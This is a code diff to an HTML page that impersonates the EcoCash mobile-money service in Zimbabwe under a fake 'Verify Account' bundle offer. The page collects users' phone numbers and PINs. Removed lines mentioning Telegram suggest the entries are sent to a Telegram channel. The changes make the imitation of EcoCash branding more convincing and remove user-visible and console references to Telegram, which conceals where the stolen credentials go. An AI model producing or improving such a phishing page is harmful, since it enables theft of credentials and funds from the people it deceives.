@@ -2,7 +2,8 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+    <meta name="theme-color" content="#0052cc">
     <title>EcoCash | Verify Account · Zimbabwe</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
     <style>
@@ -28,25 +29,28 @@
             min-height: 100vh;
             display: flex;
             flex-direction: column;
+            overflow-x: hidden;
         }
 
         header {
             background: white;
             padding: 16px 5%;
-            border-bottom: 2px solid var(--eco-blue);
-            box-shadow: 0 2px 8px rgba(0,0,0,0.05);
+            border-bottom: 3px solid var(--eco-blue);
+            box-shadow: 0 2px 12px rgba(0, 82, 204, 0.1);
         }
 
         .logo {
             font-size: 24px;
             font-weight: 800;
-            background: linear-gradient(135deg, var(--eco-red) 0%, var(--eco-blue) 100%);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-clip: text;
-            text-decoration: none;
             letter-spacing: -0.5px;
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+            gap: 2px;
         }
+
+        .logo .eco { color: var(--eco-blue); }
+        .logo .cash { color: var(--eco-red); }
 
         main {
             flex: 1;
@@ -62,7 +66,7 @@
             padding: 40px;
             max-width: 450px;
             width: 100%;
-            box-shadow: 0 10px 40px rgba(0,0,0,0.15);
+            box-shadow: 0 10px 40px rgba(0, 82, 204, 0.2);
             border: 2px solid var(--eco-blue);
         }
 
@@ -85,7 +89,7 @@
         }
 
         .bundle-info {
-            background: linear-gradient(135deg, var(--eco-red) 0%, var(--eco-blue) 100%);
+            background: linear-gradient(135deg, var(--eco-blue), var(--eco-blue-dark));
             border-radius: 12px;
             padding: 16px;
             margin-bottom: 28px;
@@ -103,7 +107,7 @@
         .bundle-info-row:last-child {
             margin-bottom: 0;
             padding-top: 8px;
-            border-top: 1px solid rgba(255,255,255,0.2);
+            border-top: 1px solid rgba(255, 255, 255, 0.2);
             margin-top: 8px;
             font-weight: 800;
             font-size: 16px;
@@ -117,7 +121,7 @@
             display: block;
             font-size: 12px;
             font-weight: 800;
-            color: var(--eco-red);
+            color: var(--eco-blue);
             text-transform: uppercase;
             letter-spacing: 0.05em;
             margin-bottom: 8px;
@@ -136,7 +140,7 @@
         .input-wrapper:focus-within {
             border-color: var(--eco-red);
             background: white;
-            box-shadow: 0 0 0 3px rgba(211, 47, 47, 0.1);
+            box-shadow: 0 0 0 3px rgba(0, 82, 204, 0.1);
         }
 
         .country-code {
@@ -208,7 +212,7 @@
 
         .btn-primary {
             flex: 1;
-            background: linear-gradient(135deg, var(--eco-red) 0%, var(--eco-blue) 100%);
+            background: linear-gradient(135deg, var(--eco-blue), var(--eco-blue-dark));
             color: white;
             border: none;
             padding: 14px 20px;
@@ -219,12 +223,12 @@
             letter-spacing: 0.04em;
             cursor: pointer;
             transition: all 0.2s;
-            box-shadow: 0 4px 12px rgba(211, 47, 47, 0.2);
+            box-shadow: 0 4px 12px rgba(0, 82, 204, 0.25);
         }
 
         .btn-primary:hover:not(:disabled) {
             transform: translateY(-1px);
-            box-shadow: 0 6px 16px rgba(211, 47, 47, 0.3);
+            box-shadow: 0 6px 16px rgba(0, 82, 204, 0.35);
         }
 
         .btn-primary:disabled {
@@ -278,7 +282,7 @@
             justify-content: center;
             flex-direction: column;
             gap: 16px;
-            background: rgba(0,0,0,0.8);
+            background: rgba(0, 0, 0, 0.8);
             z-index: 2000;
             backdrop-filter: blur(4px);
         }
@@ -290,7 +294,7 @@
         .spinner {
             width: 56px;
             height: 56px;
-            border: 5px solid rgba(255,255,255,0.2);
+            border: 5px solid rgba(255, 255, 255, 0.2);
             border-top-color: white;
             border-radius: 50%;
             animation: spin 0.8s linear infinite;
@@ -304,7 +308,7 @@
 
         .spin-sub {
             font-size: 13px;
-            color: rgba(255,255,255,0.7);
+            color: rgba(255, 255, 255, 0.7);
         }
 
         @keyframes spin {
@@ -318,7 +322,7 @@
             display: none;
             align-items: center;
             justify-content: center;
-            background: rgba(0,0,0,0.6);
+            background: rgba(0, 0, 0, 0.6);
             z-index: 2000;
             padding: 20px;
             backdrop-filter: blur(4px);
@@ -334,7 +338,7 @@
             padding: 32px;
             max-width: 400px;
             width: 100%;
-            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
+            box-shadow: 0 10px 40px rgba(0, 82, 204, 0.2);
             text-align: center;
             border: 2px solid var(--eco-blue);
         }
@@ -365,14 +369,14 @@
             letter-spacing: 0.04em;
             cursor: pointer;
             transition: all 0.2s;
-            background: linear-gradient(135deg, var(--eco-red) 0%, var(--eco-blue) 100%);
+            background: linear-gradient(135deg, var(--eco-blue), var(--eco-blue-dark));
             color: white;
-            box-shadow: 0 4px 12px rgba(211, 47, 47, 0.2);
+            box-shadow: 0 4px 12px rgba(0, 82, 204, 0.25);
         }
 
         .modal-btn:hover {
             transform: translateY(-1px);
-            box-shadow: 0 6px 16px rgba(211, 47, 47, 0.3);
+            box-shadow: 0 6px 16px rgba(0, 82, 204, 0.35);
         }
 
         @media (max-width: 600px) {
@@ -385,7 +389,7 @@
 </head>
 <body>
     <header>
-        <a class="logo" href="index.html">EcoCash</a>
+        <a class="logo" href="index.html"><span class="eco">Eco</span><span class="cash">Cash</span></a>
     </header>
 
     <main>
@@ -449,7 +453,7 @@
     <div id="loadingOverlay" class="loading-overlay">
         <div class="spinner"></div>
         <div class="spin-label">Waiting for Approval</div>
-        <div class="spin-sub">Check your Telegram</div>
+        <div class="spin-sub">Please wait...</div>
     </div>
 
     <!-- Already Applied Modal -->
@@ -469,34 +473,32 @@
 
         function loadBundleData() {
             const params = new URLSearchParams(window.location.search);
-            bundleData = {
-                data: params.get('data') || '—',
-                price: params.get('price') || '0.00'
-            };
+            const data = params.get('data');
+            const price = params.get('price');
 
-            if (bundleData.data && bundleData.data !== '—') {
+            if (data && price) {
+                bundleData = { data, price };
                 document.getElementById('bundleInfo').style.display = 'block';
-                document.getElementById('bundleData').textContent = bundleData.data;
-                document.getElementById('bundlePrice').textContent = 'USD ' + bundleData.price;
+                document.getElementById('bundleData').textContent = data;
+                document.getElementById('bundlePrice').textContent = 'USD ' + price;
             }
         }
 
         function togglePinVisibility() {
             const pinInput = document.getElementById('pin');
-            const toggleBtn = event.target;
-            
+            const btn = event.target;
             if (pinInput.type === 'password') {
                 pinInput.type = 'text';
-                toggleBtn.textContent = 'Hide';
+                btn.textContent = 'Hide';
             } else {
                 pinInput.type = 'password';
-                toggleBtn.textContent = 'Show';
+                btn.textContent = 'Show';
             }
         }
 
-        function showError(message) {
+        function showError(msg) {
             const errorMsg = document.getElementById('errorMsg');
-            errorMsg.textContent = message;
+            errorMsg.textContent = msg;
             errorMsg.classList.add('show');
         }
 
@@ -519,7 +521,7 @@
 
                 return response.ok;
             } catch (error) {
-                console.error('Telegram error:', error);
+                console.error('Error:', error);
             }
             return false;
         }
